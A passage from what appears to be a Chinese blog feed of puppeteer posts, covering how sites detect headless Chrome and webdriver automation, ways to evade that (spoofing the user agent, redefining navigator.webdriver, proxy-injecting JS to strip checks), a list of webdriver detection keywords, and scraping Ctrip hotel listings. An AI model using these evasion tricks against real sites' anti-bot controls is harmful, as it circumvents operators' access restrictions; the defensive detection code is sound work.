page.setUserAgent(conf.ua);</span><br><span class="line"><span class="keyword">await</span> page.emulate(conf.device);</span><br></pre></td></tr></table></figure><h4 id="2-检测webdriver标志字段"><a href="#2-检测webdriver标志字段" class="headerlink" title="2.检测webdriver标志字段"></a>2.检测webdriver标志字段</h4><p>防：检测window object中是否有任何<code>selenium/webdriver/$cdc_/$wdc_</code>等字样。</p><p>以下是搜索到的字段标志，只测试了在正常访问状态下并没有这些字段。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webdriver keywords</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectWebDriver</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> r = [];</span><br><span class="line"><span class="keyword">const</span> w = [<span class="string">'webdriver'</span>, <span class="string">'__driver_evaluate'</span>, <span class="string">'__webdriver_evaluate'</span>,</span><br><span class="line"><span class="string">' __selenium_evaluate'</span>, <span class="string">'__fxdriver_evaluate'</span>, <span class="string">'__driver_unwrapped'</span>,</span><br><span class="line"><span class="string">'__webdriver_unwrapped'</span>, <span class="string">'__selenium_unwrapped'</span>, <span class="string">'__fxdriver_unwrapped'</span>,</span><br><span class="line"><span class="string">'_Selenium_IDE_Recorder'</span>, <span class="string">'_selenium'</span>, <span class="string">'calledSelenium'</span>,</span><br><span class="line"><span class="string">'_WEBDRIVER_ELEM_CACHE'</span>, <span class="string">'ChromeDriverw'</span>, <span class="string">'driver-evaluate'</span>,</span><br><span class="line"><span class="string">'webdriver-evaluate'</span>, <span class="string">'selenium-evaluate'</span>, <span class="string">'webdriverCommand'</span>,</span><br><span class="line">  <span class="string">'webdriver-evaluate-response'</span>,<span class="string">'__webdriverFunc'</span>, <span class="string">'__webdriver_script_fn'</span>,</span><br><span class="line">  <span class="string">'__$webdriverAsyncExecutor'</span>, <span class="string">'__lastWatirAlert'</span>,</span><br><span class="line"><span class="string">'__lastWatirConfirm'</span>, <span class="string">'__lastWatirPrompt'</span>, <span class="string">'$chrome_asyncScriptInfo'</span>,</span><br><span class="line">  <span class="string">'$cdc_asdjflasutopfhvcZLmcfl_'</span>, <span class="string">'_phantom'</span>, <span class="string">'_phantomas'</span>];</span><br><span class="line">w.forEach(<span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!!<span class="built_in">window</span>[t] || !!<span class="built_in">window</span>.document.documentElement.getAttribute(t) || !!navigator[t]) &#123;</span><br><span class="line">r.push(t);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>人力限制不一个个测试了，不放心的话前期先记录下命中词，之后可以只要遇到命中词就拉黑拒绝提供服务。</p><p>攻：使用puppeteer会检测到webdriver，navigator.webdriver为true。</p><p>试着加上了<code>navigator.webdriver=false</code>实际上并不会生效，console出来依然是false。</p><p><code>const isAutomated = navigator.webdriver</code></p><p>这个字段就是标志了一切自动化。</p><p><code>navigator.userAgent=&#39;test&#39;</code>设置了再console也是无效的。</p><p>实际上可以使用Object.defineProperty来修改原生对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluate(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(navigator, <span class="string">'webdriver'</span>, &#123; <span class="attr">get</span>: <span class="function"><span class="params">()</span>=&gt;</span> <span class="literal">false</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是对于反爬方来说，一般在你进入页面的时候就已经开始检测是否是爬虫，立即停止服务了，在puppeteer中篡改已经晚了。</p><p>这种时候可以通过<strong>代理工具</strong>，fiddler，charles都可以完成js的注入。</p><ul><li>在检测爬虫的js前加上以上的篡改js。</li><li>或者先在正常状态下分析下源码具体检测爬虫的代码，使用代理工具，去掉识别webdriver的js（或者直接返回不是爬虫）之后再继续爬，当然这很难。</li></ul><p>前面说了js是裸奔的，顶多代码混淆下，但是也是在坏人手里的，想怎么改怎么改，只能说提高坏人作恶的成本。</p><p>防御方只能进行更大强度的代码混淆（其实也没啥用）。</p><h4 id="3-window-chrome"><a href="#3-window-chrome" class="headerlink" title="3.window.chrome"></a>3.window.chrome</h4><p>防：<code>!window.chrome||!window.chrome.runtime</code>如果是自动化的话，window.chrome会是undefined</p><p>攻：经测试puppeteer设置headless:true时，window.chrome是有值的，虽然会慢一点。或者反正也能篡改js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.navigator.chrome = &#123;</span><br><span class="line">runtime: &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有其他的检测plugins，language以及permissions，实际都可以被篡改。</p><p>看完是不是觉得非常悲观，怎么也拦不住！</p><p>还是那句话，能拦多少拦多少呗！</p><p>搞一些骚气一点的走位，其实你也发现不了我在哪里检测了</p><p>基本检测方式如下，当然还有很多别的指标来判断，我才不会告诉你。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectAuto</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/HeadlessChrome/</span>.test(navigator.userAgent) || <span class="comment">// ua test</span></span><br><span class="line">    !<span class="built_in">window</span>.chrome || <span class="comment">// headless test</span></span><br><span class="line">    navigator.plugins.length === <span class="number">0</span> || <span class="comment">//plugins test</span></span><br><span class="line">    <span class="comment">// languages test</span></span><br><span class="line">    !navigator.languages || navigator.languages.length === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> permissionStatus = <span class="keyword">await</span> navigator.permissions.query(&#123; <span class="attr">name</span>: <span class="string">'notifications'</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (Notification.permission === <span class="string">'denied'</span> &amp;&amp; permissionStatus.state === <span class="string">'prompt'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> r = [];</span><br><span class="line">  <span class="keyword">const</span> w = [<span class="string">'webdriver'</span>, <span class="string">'__driver_evaluate'</span>, <span class="string">'__webdriver_evaluate'</span>,</span><br><span class="line">    <span class="string">' __selenium_evaluate'</span>, <span class="string">'__fxdriver_evaluate'</span>, <span class="string">'__driver_unwrapped'</span>,</span><br><span class="line">    <span class="string">'__webdriver_unwrapped'</span>, <span class="string">'__selenium_unwrapped'</span>, <span class="string">'__fxdriver_unwrapped'</span>,</span><br><span class="line">    <span class="string">'_Selenium_IDE_Recorder'</span>, <span class="string">'_selenium'</span>, <span class="string">'calledSelenium'</span>,</span><br><span class="line">    <span class="string">'_WEBDRIVER_ELEM_CACHE'</span>, <span class="string">'ChromeDriverw'</span>, <span class="string">'driver-evaluate'</span>,</span><br><span class="line">    <span class="string">'webdriver-evaluate'</span>, <span class="string">'selenium-evaluate'</span>, <span class="string">'webdriverCommand'</span>, <span class="string">'webdriver-evaluate-response'</span>,</span><br><span class="line">    <span class="string">'__webdriverFunc'</span>, <span class="string">'__webdriver_script_fn'</span>, <span class="string">'__$webdriverAsyncExecutor'</span>, <span class="string">'__lastWatirAlert'</span>,</span><br><span class="line">    <span class="string">'__lastWatirConfirm'</span>, <span class="string">'__lastWatirPrompt'</span>, <span class="string">'$chrome_asyncScriptInfo'</span>, <span class="string">'$cdc_asdjflasutopfhvcZLmcfl_'</span>,</span><br><span class="line">    <span class="string">'_phantom'</span>, <span class="string">'_phantomas'</span>,</span><br><span class="line">  ];</span><br><span class="line">  w.forEach(<span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!!<span class="built_in">window</span>[t] || !!<span class="built_in">window</span>.document.documentElement.getAttribute(t) || !!navigator[t]) &#123;</span><br><span class="line">      r.push(t);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> r.length &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过js已整理好，但是还是不分享给你们这群坏人了。</p><p>参考：</p><p><a href="https://intoli.com/blog/not-possible-to-block-chrome-headless/" target="_blank" rel="noopener">https://intoli.com/blog/not-possible-to-block-chrome-headless/</a></p><p><a href="https://intoli.com/blog/making-chrome-headless-undetectable/" target="_blank" rel="noopener">https://intoli.com/blog/making-chrome-headless-undetectable/</a></p><p><a href="https://www.zhihu.com/question/50738719" target="_blank" rel="noopener">https://www.zhihu.com/question/50738719</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> puppeteer </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 puppeteer 」puppeteer初尝试</title>
      <link href="/2019/02/13/puppeteer_try/"/>
      <url>/2019/02/13/puppeteer_try/</url>
      
        <content type="html"><![CDATA[<p>上一篇中我们通过自己手写代码完成了抓取list页中的基本数据，可是沙沙又提出了新的需求，如何抓取到每个酒店的装修时间和客房数量呢？我让她自己去研究八爪鱼去了，但是如果是真的撩妹，这可不就前功尽弃了。</p><p>正好最近在研究反作弊中判断是否是webdriver，headless chrome，发现一个神器puppeteer，不需要学习python，用nodeJS就可以搞定，我的键盘已经等不及了，用了一天时间研究，分享给大家。</p><p>其实主要是async和await的理解不够深刻，多花费了时间，实际上聪明如你半个小时应该就可以学会。</p><a id="more"></a><h4 id="puppeteer"><a href="#puppeteer" class="headerlink" title="puppeteer"></a>puppeteer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建个项目安装puppeteer</span></span><br><span class="line">npm i puppeteer -S</span><br></pre></td></tr></table></figure><p>官方demo就很容易上手，再加上awesome-puppeteer中的<a href="https://medium.com/@e_mad_ehsan/getting-started-with-puppeteer-and-chrome-headless-for-web-scrapping-6bf5979dee3e" target="_blank" rel="noopener">例子</a>，很容易就可以实现自己的目标。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> conf = &#123;</span><br><span class="line">    <span class="comment">// 还是携程上海五角场江湾地区的url</span></span><br><span class="line">    workUrl: <span class="string">'http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst'</span>,</span><br><span class="line">    <span class="comment">// 设置ua，不然ua中包含headless，会被识别出来，拒绝提供服务</span></span><br><span class="line">    ua: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span>,</span><br><span class="line">    viewport: &#123;</span><br><span class="line">      width: <span class="number">1920</span>,</span><br><span class="line">      height: <span class="number">1080</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> browserSetting = &#123;</span><br><span class="line">    <span class="comment">// 默认是headless的模式打开的,改为false可以打开实际的chrome，方便我们查看</span></span><br><span class="line">    <span class="comment">// 但是设置为true会快很多</span></span><br><span class="line">    headless: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 或者直接打开指定path的chrome，最好还是使用默认提供的chromium</span></span><br><span class="line">    executablePath: <span class="string">'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe'</span>,</span><br><span class="line">    <span class="comment">// 设置后可以操作慢点方便调试</span></span><br><span class="line">    <span class="comment">// slowMo: 250,</span></span><br><span class="line">    <span class="comment">// 打开F12</span></span><br><span class="line">    devtools: <span class="literal">true</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(browserSetting);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="comment">// 页面设置</span></span><br><span class="line">  <span class="keyword">await</span> page.setViewport(conf.viewport);</span><br><span class="line">  <span class="keyword">await</span> page.setUserAgent(conf.ua);</span><br><span class="line">  <span class="comment">// await page.emulate(conf.device);</span></span><br><span class="line">  <span class="comment">// 页面跳转</span></span><br><span class="line">  <span class="keyword">await</span> page.goto(conf.workUrl);</span><br><span class="line">  <span class="comment">// page.$$(sel);= document.querySelectorAll(sel)</span></span><br><span class="line">  <span class="comment">// page.$(sel);= document.querySelector(sel)</span></span><br><span class="line">  <span class="comment">// page.$eval(sel);</span></span><br><span class="line">  <span class="comment">// page.$$eval(sel);</span></span><br><span class="line">  <span class="comment">// const els = await page.$$eval('p', els =&gt; els);// 奇怪的是这样得到的els里的元素都是&#123;&#125;</span></span><br><span class="line">  <span class="comment">// 改为</span></span><br><span class="line">  <span class="comment">// const elsHtml = await page.$$eval('p', els =&gt; els.map(el =&gt; el.innerHTML));</span></span><br><span class="line">  <span class="comment">// console.log(elsHtml);</span></span><br><span class="line">  <span class="comment">// 但个人觉得可以直接js实现的就不必用 puppeteer api，记一堆api不如用好js</span></span><br><span class="line">  <span class="keyword">const</span> hotels = <span class="keyword">await</span> page.evaluate(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里可以直接执行js代码了</span></span><br><span class="line">    <span class="keyword">const</span> resArr = [];</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 注意此处的异步操作</span></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getRes</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="comment">// return new Promise((resolve, reject) =&gt; &#123;</span></span><br><span class="line">          <span class="comment">// 因为ctrip本来就有jQuery，所以可以直接使用</span></span><br><span class="line">          <span class="keyword">const</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">            <span class="keyword">const</span> hotel = &#123;</span><br><span class="line">              name: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>`</span>,</span><br><span class="line">              address: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>, <span class="string">''</span>)&#125;</span>`</span>,</span><br><span class="line">              url: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>`</span>,</span><br><span class="line">              rate: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>`</span>,</span><br><span class="line">              price: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>`</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            resArr.push(hotel);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">let</span> $nextBtn = $(<span class="string">'.c_down'</span>);</span><br><span class="line">          <span class="keyword">if</span> ($nextBtn.length) &#123;</span><br><span class="line">            $nextBtn.click();</span><br><span class="line">            timer = setTimeout(getData, <span class="number">1000</span>);</span><br><span class="line">            $nextBtn = <span class="literal">null</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            resolve(resArr);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        getData();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加debugger可以在打开的chrome里调试js</span></span><br><span class="line">    <span class="comment">// debugger;</span></span><br><span class="line">    <span class="keyword">return</span> getRes();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以上功能都可以直接按上一篇在chrome snippet中实现，但是如果需要自动获取detail信息，就需要puppeteer来帮我们操作了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始获取detail</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getDetail</span>(<span class="params">h</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> nh = h;</span><br><span class="line">  <span class="keyword">await</span> page.goto(<span class="string">`http://hotels.ctrip.com<span class="subst">$&#123;h.url&#125;</span>`</span>);</span><br><span class="line">  nh.info = <span class="keyword">await</span> page.evaluate(<span class="function"><span class="params">()</span> =&gt;</span> $(<span class="string">'#htlDes&gt;p'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data);</span><br><span class="line">  <span class="keyword">return</span> nh;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 数量太多测试时间太长，先测试4个试下</span></span><br><span class="line">hotels.length = <span class="number">4</span>;</span><br><span class="line"><span class="comment">// 此处await不能使用forEach，await不能放在循环中，使用promise.all</span></span><br><span class="line"><span class="comment">// 参见http://es6.ruanyifeng.com/#docs/async</span></span><br><span class="line"><span class="keyword">const</span> promises = hotels.map(<span class="function"><span class="params">h</span> =&gt;</span> getDetail(h));</span><br><span class="line"><span class="keyword">await</span> <span class="built_in">Promise</span>.all(promises);</span><br><span class="line"><span class="built_in">console</span>.log(hotels);</span><br></pre></td></tr></table></figure><p>node直接写入csv文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将得到的结果写入csv文件</span></span><br><span class="line">fs.writeFile(<span class="string">'hotels.csv'</span>, hotels, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 得到csv文件会有乱码问题，可以找框架来直接转为csv文件，此处不赘述</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>以上只是puppet的最基本常用的功能，还可以做很多诸如：自动化测试，前端性能测试，异常监控等。</p><p>如果你在尝试过程中也对异步操作比较困惑，可以一起复习下async和await和promise，参见这篇（TODO async和await）。</p><p>puppeteer和Selenium/WebDriver的主要区别：</p><p>Selenium/WebDriver适用于多种浏览器</p><p>puppeteer主要作用于chromium，做到极致</p><p>我个人觉得API很多，看了也记不住，用到再去查。</p>]]></content>
      
      
      
        <tags>
            
            <tag> puppeteer </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 puppeteer 」前端如何爬虫</title>
      <link href="/2019/02/12/js_spider/"/>
      <url>/2019/02/12/js_spider/</url>
      
        <content type="html"><![CDATA[<p>本文又名十行代码帮你撩妹。</p><h4 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h4><p>今天沙沙在群里向我们紧急求助，领导让她整理【携程江湾五角场地区的260家酒店的名称，价格，地址，网址，评分信息制成excel】。</p><p>PM（也是前php开发者）咕咕推荐了【八爪鱼】这个工具，不懂技术的小白也能抓取数据。</p><p>作为一个程序员，很惭愧的说自己其实没接触过爬虫，之前说的要学python也没学几天就放弃了，现学肯定来不及了，作为一个不懂python的前端，如何帮上沙沙的忙呢？<br><a id="more"></a></p><h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>其实也就是返回的json处理一下嘛，我们先来看看页面的逻辑。</p><p>先访问列出这260家酒店的url：<a href="http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst。" target="_blank" rel="noopener">http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst。</a></p><p>在chrome devtool的network中选择xhr，凭借我们多年的工作经验，来判断下到底是哪个接口返回了hotelsList的信息。<br><img src="/images/ctrip1.png" alt=""><br>先锁定了/AjaxGetGroupProductList.aspx这个接口，本以为直接copy下json，简单处理下就完工了，顶多有个分页</p><p>需要多次请求。但是what？这个接口居然没有response body！</p><p>回想起之前看到很多反爬故事的文章都出自携程和去哪儿，怎么可能这么容易就被爬到数据呢？</p><p>分析接口这条路可能还需要点成本，冷静下思考，其实小伙伴的要求并不高，数据量也并不大，说不定只通过前端知识就可以获取到我们想要的结果。</p><p>试了试八爪鱼，看起来也是设定好需要的div，获取div。马上有了思路，既然接口hook走不通，不如前端老本行，所见即所得，通过jquery直接获取页面上的元素，界面是不可能骗人的，那我们开始写代码。</p><h4 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">  <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">  t += <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>,<span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">  <span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>,<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>\n`</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是酒店数据是分页显示的，只好手动一页一页的点击运行来获取。<br>Tips：<br>1.这里用到了chrome devtool的snippet，可以保存在chrome里，直接右键run一下就可以运行。比直接粘在console里要灵活。<br>2.携程本身的页面有jQuery，所以我们可以直接使用jQuery。<br><img src="/images/ctrip2.png" alt=""></p><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>手动翻页也太low了吧，后来惊喜的发现居然是单页应用，点击下一页并没有刷新页面，我们可以用代码来帮我们直接点击。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> t = <span class="string">'名字,地址,网址,评分,价格\n'</span>;</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">let</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">        t += <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>,<span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>,</span></span><br><span class="line"><span class="string">        <span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>,<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>\n`</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">let</span> $nextBtn = $(<span class="string">'.c_down'</span>);</span><br><span class="line">      <span class="keyword">if</span> ($nextBtn.length) &#123;</span><br><span class="line">        $nextBtn.click();</span><br><span class="line">        timer = setTimeout(getData, <span class="number">1000</span>);</span><br><span class="line">      <span class="comment">// 分页结束啦</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        clearTimeout(timer);</span><br><span class="line">        <span class="built_in">console</span>.log(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getData();</span><br><span class="line">  